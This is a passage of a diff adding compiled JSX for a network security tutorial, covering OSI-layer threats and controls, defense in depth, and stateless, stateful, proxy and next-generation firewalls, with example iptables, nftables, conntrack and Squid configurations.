+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "OSI Layer"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Protocol Example"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Common Threats"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Security Controls"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "7 → Application"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "HTTP, DNS, SMTP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SQL injection, XSS, DNS poisoning"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "WAF, DNSSEC, input validation"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "6 → Presentation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TLS/SSL"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Weak cipher downgrade"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Enforce TLS 1.2+"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "5 → Session"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SOCKS, RPC"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Session hijacking"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Token rotation, mTLS"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "4 → Transport"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TCP, UDP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SYN flood, port scan"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Stateful firewall, SYN cookies"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "3 → Network"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IP, ICMP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IP spoofing, Smurf attack"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ACLs, ingress filtering, IPsec"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "2 → Data Link"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Ethernet, ARP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ARP spoofing, MAC flooding"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Port security, Dynamic ARP Inspection"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "1 → Physical"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Cables, RF"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Tapping, rogue AP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "802.1X, port authentication"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "12-cia-triad-in-network-context",
+      children: "1.2 CIA Triad in Network Context"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Confidentiality"
+        }), " → Encryption (TLS, IPsec), VPNs"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Integrity"
+        }), " → Hashing, digital signatures, HMAC"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Availability"
+        }), " → DDoS mitigation, redundant paths, load balancing"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "13-defense-in-depth-layered-security",
+      children: "1.3 Defense-in-Depth (Layered Security)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Internet\n   |\n[WAF] → Application-layer filtering\n   |\n[NGFW] → Deep packet inspection, app control\n   |\n[IDS/IPS] → Threat detection and inline blocking\n   |\n[VPN Gateway] → Encrypted tunnels\n   |\n[DMZ] → Public-facing servers isolated\n   |\n[Internal Firewall] → Segmentation between zones\n   |\n[Internal Network]\n   |\n[NAC] → Endpoint compliance check\n   |\n[Host Firewall + EDR] → Endpoint protection\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-2-firewalls",
+      children: "Section 2: Firewalls"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "21-what-is-a-firewall",
+      children: "2.1 What Is a Firewall?"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "A firewall is a network security device that monitors and controls incoming and outgoing traffic based on predetermined security rules. It acts as a barrier between trusted internal networks and untrusted external networks."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Real-World Analogy:"
+      }), " A firewall is like a security guard at a building entrance. The guard checks every person's ID (packet header), verifies they are expected (connection state), inspects their bag (deep packet inspection), and decides whether to allow entry based on rules."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "22-packet-filter-firewall-stateless",
+      children: "2.2 Packet Filter Firewall (Stateless)"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "How it works:"
+      }), " Examines each packet in isolation. Decisions are based solely on header fields:"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Source IP, Destination IP"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Source Port, Destination Port"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Protocol (TCP, UDP, ICMP)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Configuration Steps (iptables):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Step 1: Set default policies\n  iptables -P INPUT DROP\n  iptables -P FORWARD DROP\n  iptables -P OUTPUT ACCEPT\n\nStep 2: Allow loopback\n  iptables -A INPUT -i lo -j ACCEPT\n\nStep 3: Allow established connections\n  iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\nStep 4: Allow SSH from management subnet\n  iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT\n\nStep 5: Allow HTTP/HTTPS\n  iptables -A INPUT -p tcp --dport 80 -j ACCEPT\n  iptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\nStep 6: Log and drop everything else\n  iptables -A INPUT -j LOG --log-prefix \"FW-DROP: \"\n  iptables -A INPUT -j DROP\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Dry Run → Packet Filter Decision:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: ["Consider an incoming TCP SYN packet: ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "src=10.0.0.5:54321, dst=192.168.1.1:80"
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Rule 1: -P INPUT DROP → default is drop\nRule 2: -i lo? No (comes from eth0) → skip\nRule 3: --state ESTABLISHED,RELATED? No (SYN is NEW) → skip\nRule 4: -p tcp --dport 22? No (dport is 80) → skip\nRule 5: -p tcp --dport 80? Yes → ACCEPT\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Complexity:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Time: O(n) where n = number of rules (linear scan)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Space: O(1) per rule"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Advantages & Disadvantages:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Advantages"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Disadvantages"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Very fast (simple header check)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No connection awareness"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Low resource consumption"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Cannot detect fragmented packet attacks"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Simple to configure"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No application-layer inspection"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Hardware-efficient"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Easily bypassed with source port manipulation"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Edge Cases:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "IP fragmentation:"
+        }), " Fragmented packets may bypass rules that check Layer 4 headers (only first fragment has port info)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Source port manipulation:"
+        }), " Attackers use allowed source ports (e.g., 80, 443) to bypass rules"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "ICMP filtering:"
+        }), " Overly restrictive ICMP filtering breaks PMTUD (Path MTU Discovery)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "UDP flooding:"
+        }), " Stateless firewalls cannot distinguish legitimate UDP from flood traffic"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "23-stateful-firewall",
+      children: "2.3 Stateful Firewall"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "How it works:"
+      }), " Maintains a connection state table. Decisions consider the entire session context, not individual packets."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Connection Tracking Table:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Src IP"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Src Port"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Dst IP"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Dst Port"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Protocol"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "State"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "10.0.0.5"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "52341"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "142.250.80.46"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "443"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TCP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ESTABLISHED"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "10.0.0.5"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "52342"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "151.101.1.140"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "443"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TCP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TIME_WAIT"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "192.168.1.1"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "22"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "10.0.0.5"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "54321"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TCP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ESTABLISHED"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Dry Run → Stateful Decision for a Return Packet:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: ["Incoming packet: ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "src=142.250.80.46:443, dst=10.0.0.5:52341"
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Lookup conntrack: {10.0.0.5:52341 → 142.250.80.46:443}\nFind match (direction reversed): YES\nState: ESTABLISHED → ALLOW\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "nftables Equivalent (modern replacement for iptables):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "table inet filter {\n    chain input {\n        type filter hook input priority 0; policy drop;\n\n        # Allow loopback\n        i lo accept\n\n        # Allow established/related\n        ct state established,related accept\n\n        # Allow specific services\n        tcp dport {ssh, http, https} ct state new accept\n\n        # Log dropped packets\n        log prefix \"nft-drop: \" counter drop\n    }\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Conntrack tool commands:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# View active connection tracking\nconntrack -L\n\n# Expected output:\n# tcp      6 431997 ESTABLISHED src=10.0.0.5 dst=142.250.80.46 sport=52341 dport=443\n#   src=142.250.80.46 dst=10.0.0.5 sport=443 dport=52341 [ASSURED] mark=0 use=1\n\n# Count connections\nconntrack -C\n\n# Expected output: 327\n\n# Delete all connections from an IP\nconntrack -D -s 10.0.0.5\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Complexity:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Time: O(1) for established connections (hash lookup) + O(n) for new connections"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Space: O(m) where m = number of active connections (up to millions)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Advantages & Disadvantages:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Advantages"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Disadvantages"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Connection-aware: blocks invalid packets (e.g., ACK without SYN)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Higher memory usage for state table"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Protects against many spoofing and hijack attempts"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "State table exhaustion (DoS vector)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Automatically handles dynamic ports (FTP, SIP)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Slightly slower for first packet of each flow"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "More secure than stateless for same rule set"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Complex to troubleshoot"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Edge Cases:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "State table exhaustion:"
+        }), " Attackers fill the conntrack table with half-open connections (nftables can set ", (0,jsx_runtime.jsx)(_components.code, {
+          children: "ct count"
+        }), " limits)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Asymmetric routing:"
+        }), " Packets take different paths; state table misses return traffic"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "FTP ALG:"
+        }), " Active FTP uses PORT command for dynamic ports; firewall must inspect FTP control channel"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "SIP/RTP:"
+        }), " VoIP uses dynamic RTP ports; stateful inspection required for media streams"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "24-proxy-firewall-application-gateway",
+      children: "2.4 Proxy Firewall (Application Gateway)"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "How it works:"
+      }), " Acts as an intermediary. Clients connect to the proxy, which creates a separate connection to the destination. The proxy inspects application-layer data."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Types:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Forward Proxy:"
+        }), " Clients use proxy to access internet"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Reverse Proxy:"
+        }), " External clients access internal servers through proxy"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Transparent Proxy:"
+        }), " Intercepts traffic without client configuration"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Squid Proxy Configuration:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "# /etc/squid/squid.conf\n\n# Allow local network\nacl localnet src 192.168.1.0/24\n\n# Define SSL ports\nacl SSL_ports port 443\n\n# Define safe ports\nacl Safe_ports port 80      # http\nacl Safe_ports port 443     # https\n\n# Deny requests to unsafe ports\nhttp_access deny !Safe_ports\n\n# Deny CONNECT to non-SSL ports\nhttp_access deny CONNECT !SSL_ports\n\n# Allow localnet access\nhttp_access allow localnet\n\n# Default deny\nhttp_access deny all\n\n# Listen on port 3128\nhttp_port 3128\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Advantages & Disadvantages:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Advantages"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Disadvantages"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Full application-layer inspection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Performance overhead (terminates connections)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Hides internal network topology"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Must understand each application protocol"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Can cache content (reduced bandwidth)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Not all protocols can be proxied"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Content filtering (URLs, malware)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Certificate management for HTTPS interception"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Edge Cases:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "HTTPS interception:"
+        }), " Requires installing CA certificate on clients (man-in-the-middle design)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "WebSocket support:"
+        }), " Not all proxies handle WebSocket upgrade properly"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Non-HTTP protocols:"
+        }), " Custom TCP-based apps need SOCKS proxy instead"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Authentication:"
+        }), " NTLM/Kerberos authentication can cause latency"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "25-next-generation-firewall-ngfw",
+      children: "2.5 Next-Generation Firewall (NGFW)"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "How it works:"
+      }), " Combines traditional firewall capabilities with:"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Deep Packet Inspection (DPI) → inspects payload beyond headers"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Application Identification → recognizes apps regardless of port/protocol"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "User Identity Awareness → integrates with AD/LDAP"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Encrypted Traffic Inspection → TLS/SSL decryption and inspection"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Intrusion Prevention System (IPS) → inline threat blocking"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "NGFW vs Traditional Firewall:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Feature"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Packet Filter"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Stateful"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "NGFW"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Header inspection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Connection tracking"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "App-layer inspection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Limited"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (DPI)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "App identification"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "User identity"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (AD integration)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "IPS integration"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "TLS inspection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
